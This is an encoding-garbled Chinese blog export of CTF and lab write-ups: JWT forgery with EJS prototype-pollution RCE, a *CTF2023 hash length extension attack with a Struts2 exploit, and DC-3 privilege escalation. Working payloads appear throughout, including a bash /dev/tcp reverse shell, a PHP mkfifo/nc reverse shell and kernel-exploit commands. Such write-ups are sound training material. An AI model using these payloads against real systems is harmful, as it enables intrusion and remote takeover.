<p>åœ¨&#x2F;registerä¸‹æ³¨å†Œå123ï¼š123ï¼Œä¼šç»™ä¸€ä¸ªtoken<br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY5MzU4NDM0NH0.i1rjUzM3MYuzBMzz3sW023l-mt4Sd6VAHkdS5UxYF3g</code><br>ç™»å½•æ—¶éœ€è¦ç”¨æˆ·å+å¯†ç +tokenã€‚ä½†æ˜¯æˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·ä¸èƒ½&#x2F;updateã€‚<br><img src="https://img-blog.csdnimg.cn/147fab8f0404456fb686b4acd0d9ec5d.png" alt="1"><br>è¿™ä¹Ÿå°±ç…§åº”äº†è¿™éƒ¨åˆ†é€»è¾‘</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœç”¨æˆ·åæ˜¯nssåé¢æ‰æœ‰å‡ºflagçš„å¯èƒ½ã€‚ä½†æ˜¯nssç”¨æˆ·å·²ç»å­˜åœ¨äº†ï¼Œè¯´æ˜è¿™é‡Œéœ€è¦æˆ‘ä»¬ç™»å½•nssç”¨æˆ·ã€‚<br>çœ‹ä¸€ä¸‹tokenå€¼<br><img src="https://img-blog.csdnimg.cn/86cbadda16d549b494ecc4c5c66dd2c8.png" alt="2"><br>è¿™é‡Œçš„HS256ä¹Ÿå°±æ˜¯HMACç®—æ³•</p>
<blockquote>
<p>ä¸ºäº†é˜²æ­¢é»‘å®¢é€šè¿‡å½©è™¹è¡¨æ ¹æ®å“ˆå¸Œå€¼åæ¨åŸå§‹å£ä»¤ï¼Œåœ¨è®¡ç®—å“ˆå¸Œçš„æ—¶å€™å¢åŠ äº†ä¸€ä¸ªsaltæ¥ä½¿å¾—ç›¸åŒçš„è¾“å…¥ä¹Ÿèƒ½å¾—åˆ°ä¸åŒçš„å“ˆå¸Œå€¼ï¼Œå¢å¤§äº†é»‘å®¢ç ´è§£å“ˆå¸Œçš„éš¾åº¦ã€‚<br>å¦‚æœsaltæ˜¯æˆ‘ä»¬è‡ªå·±éšæœºç”Ÿæˆçš„ï¼Œé€šå¸¸æˆ‘ä»¬åœ¨è®¡ç®—MD5æ—¶é‡‡ç”¨<code>md5(message+salt)</code>ã€‚å®é™…ä¸Šå°±æ˜¯æŠŠsaltçœ‹åšä¸€ä¸ªå£ä»¤ï¼ŒåŠ saltçš„å“ˆå¸Œå°±æ˜¯ï¼šè®¡ç®—ä¸€æ®µmessageçš„å“ˆå¸Œæ—¶ï¼Œæ ¹æ®ä¸åŒå£ä»¤è®¡ç®—å‡ºä¸åŒçš„å“ˆå¸Œã€‚è¦éªŒè¯å“ˆå¸Œå€¼ï¼Œå¿…é¡»åŒæ—¶æä¾›æ­£ç¡®çš„å£ä»¤ã€‚<br>è¿™å®é™…ä¸Šå°±æ˜¯Hmacç®—æ³•ï¼šKeyed-Hashing for Message Authenticationã€‚å®ƒé€šè¿‡ä¸€ä¸ªæ ‡å‡†ç®—æ³•ï¼Œåœ¨è®¡ç®—å“ˆå¸Œçš„è¿‡ç¨‹ä¸­ï¼ŒæŠŠkeyæ··å…¥è®¡ç®—è¿‡ç¨‹ä¸­ã€‚<br>å’Œæˆ‘ä»¬è‡ªå®šä¹‰çš„åŠ saltç®—æ³•ä¸åŒï¼ŒHmacç®—æ³•é’ˆå¯¹æ‰€æœ‰å“ˆå¸Œç®—æ³•éƒ½é€šç”¨ï¼Œæ— è®ºæ˜¯MD5è¿˜æ˜¯SHA-1ã€‚é‡‡ç”¨Hmacæ›¿ä»£æˆ‘ä»¬è‡ªå·±çš„saltç®—æ³•ï¼Œå¯ä»¥ä½¿ç¨‹åºç®—æ³•æ›´æ ‡å‡†åŒ–ï¼Œä¹Ÿæ›´å®‰å…¨ã€‚</p>
</blockquote>
<p>å†…å®¹ä¸­æœ‰æ—¶é—´æˆ³ï¼ˆæ—¶é—´æˆ³ä»£è¡¨è¿™ä¸ªjwtè®¸å¯ç­¾å‘çš„æ—¶é—´ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ç­¾åå°±ä¼šå¤±æ•ˆï¼Œåœ¨jwt.verifyçš„æ—¶å€™å°±ä¼šéªŒè¯è¿™ä¸ªiatæ¥åˆ¤æ–­jwtçš„æœ‰æ•ˆæ€§ã€‚ï¼‰<br>&#x2F;loginå¯ä»¥çœ‹å‡ºjwtè¯¥å¦‚ä½•ä¼ªé€ ï¼š</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>secretå“ªæ¥çš„å‘¢ï¼Ÿ</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sidåˆæ˜¯å“ªæ¥çš„å‘¢ï¼Ÿ</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sidå°±æ˜¯æˆ‘ä»¬ä¼ å…¥jwté‡Œé¢çš„secretidï¼Œåé¢éªŒè¯äº†sidä¸èƒ½ä¸ºnullï¼ˆç©ºï¼‰å’Œundefinedï¼Œé‚£ä¹Ÿå°±ä¸èƒ½é€šè¿‡ç›´æ¥ç½®ç©ºsidæ¥ç»•è¿‡ï¼Œsecretæ˜¯ç›´æ¥é€šè¿‡secret[sid]è·å–ï¼Œé‚£ä¹ˆè¿™ä¸ªsidå°±ç›´æ¥ä¼ å…¥ä¸€ä¸ª<code>[]</code>ï¼Œå°±å¯ä»¥å¯¼è‡´secretä¸ºç©ºï¼Œé‚£ä¹ˆjwtç›´æ¥æŒ‡å®šç©ºç®—æ³•ä¹Ÿå°±å¯ä»¥é€šè¿‡éªŒè¯ã€‚<br><img src="https://img-blog.csdnimg.cn/28f08cdf50bb4c89a25f55d92309001b.png" alt="5"><br>ç„¶åæˆåŠŸç™»å½•nssã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åè¿™é‡Œ<code>lodash.merge</code>æœ‰ä¸ªejsåŸå‹é“¾æ±¡æŸ“rceï¼Œä½¿ç”¨ä¸‹é¢è¿™ä¸ªè¿›è¡Œåå¼¹shellã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
    <span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
            <span class="token string-property property">"client"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/x.x.x.x/4444 0>&amp;1\"');"</span><span class="token punctuation">,</span><span class="token string-property property">"compileDebug"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/d7cdae347d354d2095b299a191781c92.png" alt="1"><br>ç„¶ååœ¨vpså¼€å¯ç›‘å¬åè®¿é—®&#x2F;homeåshellå³å¯åå¼¹åˆ°vpsä¸Šã€‚<br><img src="https://img-blog.csdnimg.cn/d9aca416514840d5a8bda2d576dd09c7.png" alt="6"><br>æŸ¥çœ‹ç¯å¢ƒå˜é‡å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/b13276b67e4c413d9828703a218e0f81.png" alt="6"></p>
<h3 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h3><p>èµ„æ–™<br><a href="https://xz.aliyun.com/t/6776#toc-8">æ”»å‡»JWTçš„ä¸€äº›æ–¹æ³•</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1183198304823296">hmac</a></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>(å…­æ˜Ÿ)CTF2023</title>
    <url>/2023/07/30/(%E5%85%AD%E6%98%9F)CTF2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<p><img src="https://img-blog.csdnimg.cn/471de38845874a84a1a1673a28a23118.jpeg#pic_center" alt="*CTF2023"></p>
<p><img src="https://img-blog.csdnimg.cn/326ea0d2418342a985041a588461e760.png" alt="1"></p>
<h2 id="MISC-snippingTools"><a href="#MISC-snippingTools" class="headerlink" title="MISC-snippingTools"></a>MISC-snippingTools</h2><p>cve-2023-28303<br>æ‰¾åˆ°ä¸€ä¸ªexp</p>
<p><a href="https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02">https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02</a></p>
<p>åˆ©ç”¨è„šæœ¬è¿è¡Œï¼Œé¢˜ç›®ä¸­è¯´æˆªå–æ•´ä¸ªå±å¹•é‚£ä¹Ÿå°±æ˜¯2560*1600</p>
<p>è¿è¡Œè„šæœ¬</p>
<blockquote>
<p>python 1.py 2560 1600 1.png 2.png</p>
</blockquote>
<p>å¾—åˆ°2.pngå›¾ç‰‡</p>
<p>flagçœ‹ä¸æ¸…åˆ©ç”¨Stegsolve.jarçŸ«æ­£</p>
<p><img src="https://img-blog.csdnimg.cn/e8ee345b4f5546ba8ea1ef6bc526e853.png#pic_center" alt="1"></p>
<p>*ctf{cve-2023-28303-windows-snipping-tool-is-not-secure-4E9019139D9A}</p>
<h2 id="WEB-jwt2struts"><a href="#WEB-jwt2struts" class="headerlink" title="WEB-jwt2struts"></a>WEB-jwt2struts</h2><p>è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹ï¼š</p>
<blockquote>
<p>JWT+HASHæ‰©å±•æ”»å‡»+struct2æ¼æ´</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/dd019c9dd6014989aa2bfce816280f5e.png" alt="1"></p>
<p>å°†access_tokenä¸­çš„è§£å¯†åå¯çŸ¥ç”¨æˆ·ä¸ºuserï¼Œè¦æ”¹ä¸ºadminï¼Œå°±éœ€è¦çŸ¥é“keyã€‚<br><img src="https://img-blog.csdnimg.cn/2493b913c66145efb9947b91334c386c.png" alt="2"><br>æŸ¥çœ‹æºç ä¹‹åå‘ç°è·¯å¾„<code>JWT_key.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"./secret_key.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"./salt.php"</span><span class="token punctuation">;</span>
<span class="token comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span>
<span class="token comment">//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df</span>
@<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"digest"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"The secret_key is "</span><span class="token operator">.</span> <span class="token variable">$secret_key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œè¿™é‡Œæ¨èä¸€ç¯‡æ–‡ç« <a href="https://ventureyu.github.io/2018/08/14/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95/">å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</a><br>è¿™é‡Œä½¿ç”¨åˆ°å·¥å…·hashpump<br><img src="https://img-blog.csdnimg.cn/672b58df3ff446078a98821ee0bf7a5c.png" alt="2"></p>
<p>å°†<code>\x</code>æ”¹ä¸º<code>%</code>ï¼Œå¾—åˆ°key<code>sk-he00lctf3r</code><br><img src="https://img-blog.csdnimg.cn/338b99d6f5db4cad8a6ab2ff08fc8871.png" alt="123"><br>å†è®¿é—®ç½‘ç«™è·³è½¬åˆ°&#x2F;admiiiiiiiiiiinã€‚<br><img src="https://img-blog.csdnimg.cn/b7edcf764280415dbf8e4b5da9dda22d.png" alt="1"><br>æŸ¥çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/8b32d79da7a74173907f4b7bbc5b4413.png" alt="2"><br>ä½¿ç”¨æ¼æ´æ£€æµ‹å·¥å…·æ£€æµ‹ï¼Œå¤åˆ¶ç½‘å€<strong><a href="http://140.210.223.216:55557/admiiiiiiiiiiin/user.action">http://140.210.223.216:55557/admiiiiiiiiiiin/user.action</a></strong><br>æ£€æµ‹åˆ°æ¼æ´</p>
<p><img src="https://img-blog.csdnimg.cn/39f533a11214400bb63fd2e1141eeab1.png" alt="3"><br>æŸ¥çœ‹ç¯å¢ƒå˜é‡å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/85007a54f8e44a86a5111539041c805e.png" alt="2"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3</title>
    <url>/2023/07/23/DC-3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªé¶åœºå°±ä¸€ä¸ªç›®çš„â€”â€”ææƒã€‚ä¸»è¦å†™ä¸€ä¸‹å…³é”®çš„çŸ¥è¯†ç‚¹ï¼Œå®Œæ•´æµç¨‹ä¸å†™äº†ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="dirbå·¥å…·è¿›è¡Œæ‰«æç›®å½•"><a href="#dirbå·¥å…·è¿›è¡Œæ‰«æç›®å½•" class="headerlink" title="dirbå·¥å…·è¿›è¡Œæ‰«æç›®å½•"></a>dirbå·¥å…·è¿›è¡Œæ‰«æç›®å½•</h3><p>ä»¥åæ‰«ç›®å½•æ˜¯åˆæœ‰ä¸€ä¸ªæ–°çš„å·¥å…·â€”â€”dirbã€‚<br>ä½¿ç”¨æ–¹æ³•</p>
<blockquote>
<p>æ ¼å¼ï¼šdirb <url_base> [&lt;wordlist_file(s)&gt;] [options]<br>-a è®¾ç½®user-agent<br>-p &lt;proxy[:port]&gt;è®¾ç½®ä»£ç†<br>-c è®¾ç½®cookie<br>-z æ·»åŠ æ¯«ç§’å»¶è¿Ÿï¼Œé¿å…æ´ªæ°´æ”»å‡»<br>-o è¾“å‡ºç»“æœ<br>-X åœ¨æ¯ä¸ªå­—å…¸çš„åé¢æ·»åŠ ä¸€ä¸ªåç¼€<br>-H æ·»åŠ è¯·æ±‚å¤´<br>-i ä¸åŒºåˆ†å¤§å°å†™æœç´¢</p>
</blockquote>
<p>è¯¦ç»†ä½¿ç”¨æ–¹æ³•çœ‹è¿™ç¯‡æ–‡ç« <a href="https://xz.aliyun.com/t/3958">John the Ripper</a></p>
<h3 id="searchsploit-å·¥å…·è¿›è¡Œæœç´¢æ¼æ´"><a href="#searchsploit-å·¥å…·è¿›è¡Œæœç´¢æ¼æ´" class="headerlink" title="searchsploit å·¥å…·è¿›è¡Œæœç´¢æ¼æ´"></a>searchsploit å·¥å…·è¿›è¡Œæœç´¢æ¼æ´</h3><p>ç®€ä»‹ï¼šsearchsploitæ˜¯ä¸€ä¸ªç”¨äºExploit-DBçš„å‘½ä»¤è¡Œæœç´¢å·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬æŸ¥æ‰¾æ¸—é€æ¨¡å—ã€‚<br>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/f6ff9033f2e14dd9a0d739b36280842c.png" alt="1"></p>
<p>åœ¨æœç´¢åˆ°æ¼æ´åå°†æ–‡ä»¶å¤åˆ¶åˆ°æŒ‡å®šç›®å½•</p>
<blockquote>
<p><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt ./Desktop/</code></p>
</blockquote>
<p>æˆ‘å½“æ—¶æœ¬åœ°æœ‰è¿™ä¸€ä¸ªPOCå°±ç›´æ¥ç”¨sqlmapç›´æ¥æŠ¥å‡ºæ¥äº†è´¦å·å¯†ç ã€‚</p>
<h3 id="johnå·¥å…·è¿›è¡Œå¯†ç ç ´è§£"><a href="#johnå·¥å…·è¿›è¡Œå¯†ç ç ´è§£" class="headerlink" title="johnå·¥å…·è¿›è¡Œå¯†ç ç ´è§£"></a>johnå·¥å…·è¿›è¡Œå¯†ç ç ´è§£</h3><p>å…ˆåˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå†™å…¥å¯†æ–‡ã€‚<br>ç„¶åä½¿ç”¨å‘½ä»¤john 1.txtï¼Œå¾ˆå¿«å°±çˆ†ç ´å‡ºå¯†ç äº†ã€‚<br><img src="https://img-blog.csdnimg.cn/b06439e17edc43c8984860f6c30511ee.png" alt="2"><br>ç™»å½•åå°ä¹‹åå†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚<br><img src="https://img-blog.csdnimg.cn/a276bfdc2f1a4d4dba03be0f85a5102c.png" alt="3"></p>
<p>æˆ‘ä¸€å¼€å§‹ç”¨èšå‰‘è¿æ¥ä¹‹åè¿›è¡Œå†…æ ¸ææƒç»“æœæœ€åå¤±è´¥äº†ï¼Œåå¼¹shellä¹‹åææƒæˆåŠŸã€‚</p>
<h3 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h3><p>å…ˆæŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/issue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/78e3b21b476f4f90907e7c8a09de5f7b.png" alt="2"><br>è·å–ç³»ç»Ÿå†…æ ¸å’Œæ“ä½œç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/eb314af17f7848ff968aa5a820a7ab5e.png" alt="2"></p>
<blockquote>
<ul>
<li>Linuxï¼šæ“ä½œç³»ç»Ÿç±»å‹ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªLinuxç³»ç»Ÿã€‚</li>
<li>DC-3ï¼šä¸»æœºåæˆ–è®¡ç®—æœºåç§°ã€‚</li>
<li>4.4.0-21-genericï¼šå†…æ ¸ç‰ˆæœ¬å·ï¼Œè¿™é‡Œè¡¨ç¤ºLinuxå†…æ ¸ç‰ˆæœ¬ä¸º4.4.0-21-genericã€‚</li>
<li>#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016ï¼šè¡¥ä¸çº§åˆ«å’Œæ„å»ºä¿¡æ¯ï¼Œæ˜¾ç¤ºäº†è¯¥å†…æ ¸æ˜¯åœ¨2016å¹´4æœˆ18æ—¥18æ—¶34åˆ†49ç§’ï¼ˆåè°ƒä¸–ç•Œæ—¶ï¼‰æ„å»ºçš„ï¼ŒåŒæ—¶é€‚ç”¨äºUbuntuç³»ç»Ÿï¼Œå¹¶ä¸”åœ¨æ„å»ºæ—¶ä½¿ç”¨äº†ç¬¬37ä¸ªSMPï¼ˆå¯¹ç§°å¤šå¤„ç†ï¼‰è¡¥ä¸ã€‚</li>
<li>i686 i686 i686ï¼šCPUæ¶æ„ï¼Œè¿™é‡Œè¡¨ç¤ºæ˜¯i686æ¶æ„ï¼Œå³32ä½x86æ¶æ„ã€‚</li>
<li>GNU&#x2F;Linuxï¼šæ“ä½œç³»ç»Ÿç±»å‹ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªGNU&#x2F;Linuxç³»ç»Ÿï¼Œå…¶ä¸­GNUæ˜¯ä¸€ä¸ªè‡ªç”±è½¯ä»¶æ“ä½œç³»ç»Ÿçš„ç»„æˆéƒ¨åˆ†ã€‚</li>
</ul>
</blockquote>
<p>åé¢å°±å¼€å§‹åå¼¹shellè¿›è¡Œææƒ</p>
<blockquote>
<p>kali:<code>nc -lnvp 6666</code><br>é¶æœº:åˆ›å»ºä¸€ä¸ªPHPæ–‡ä»¶<br><code>&lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.206.134 6666 &gt;/tmp/f&#39;);?&gt;  </code></p>
</blockquote>
<p>wgetå‘½ä»¤ä¸‹è½½æ‰¾åˆ°çš„zipæ–‡ä»¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<blockquote>
<p>unzip 39772.zip<br>tar -xvf exploit.tar<br>cd ebpf*<br>.&#x2F;compile.sh<br>.&#x2F;doubleput</p>
</blockquote>
